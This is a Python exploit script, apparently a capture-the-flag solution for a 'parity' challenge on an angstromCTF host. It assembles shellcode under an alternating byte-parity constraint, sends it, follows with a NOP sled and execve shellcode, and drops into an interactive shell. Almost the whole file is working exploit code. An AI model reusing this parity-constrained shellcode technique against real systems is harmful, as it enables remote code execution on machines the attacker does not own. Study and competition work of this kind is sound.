#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep
from z3 import *

exe  = context.binary = ELF('./parity')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31226)

gdbscript = '''
tbreak main
continue
b *main+255
si
continue
'''.format(**locals())

def check(sallcode):
	for i in range(len(sallcode)):
		if ((sallcode[i]) & 1) != i %2:
			try:
				chr(sallcode[i+1])
				print(f"bad sallcode character on {i} := {hex(sallcode[i])} : {chr(sallcode[i])} adjacent to {hex(sallcode[i+1])} {chr(sallcode[i+1])}")
			except:
				print(f"bad sallcode character on {i} := {hex(sallcode[i])} : {chr(sallcode[i])}  last byte")

			try:
				print(disasm(chr(i).encode('utf-8')))
			except:
				print("unable to disassemble opcode")


def make_rdx(value):
	global sallcode
	sallcode += asm("push rdi")
	sallcode += asm(f"push {value}")
	sallcode += asm("xor al, 0x1")
	sallcode += asm("add al, 0x1")
	sallcode += asm("pop rdx")


libc=SetupLibcELF()
io=start()

# abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ

sallcode = b""
sallcode += asm("push rsi") + b"\x91"
sallcode += asm("pop rax") # make rax point to shellcode address

sallcode += asm("push rdi")
sallcode += asm("add rsi, r11")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")
# 
sallcode += asm("push rdi")
sallcode += asm("inc rsi")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")


sallcode += asm("push rdi")
sallcode += asm("inc rsi")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")

sallcode += asm("push rdi")
sallcode += asm("inc rsi")

make_rdx(0x59)
sallcode += asm("push rdi")
sallcode += asm("dec rdx")

sallcode += asm("push rdi")
sallcode += asm("add qword ptr [rsi+0x1], rdx")

sallcode += asm("inc rsi")

make_rdx(0xf)
sallcode += asm("push rdi")
sallcode += asm("add qword ptr [rsi+0x1], rdx")

sallcode += asm("inc rsi")
sallcode += asm("push rdi")

sallcode += asm("nop")
make_rdx(0x5)
sallcode += asm("push rdi")
sallcode += asm("add qword ptr [rsi+0x1], rdx")

sallcode += asm("nop")
sallcode += asm("push rbx")
sallcode += asm("pop rdx")


print(sallcode)
print(check(sallcode))
print(disasm(sallcode))

sa("> ", sallcode)
pause()
s(b"\x90"*0x10 + asm(execve_x64))

io.interactive()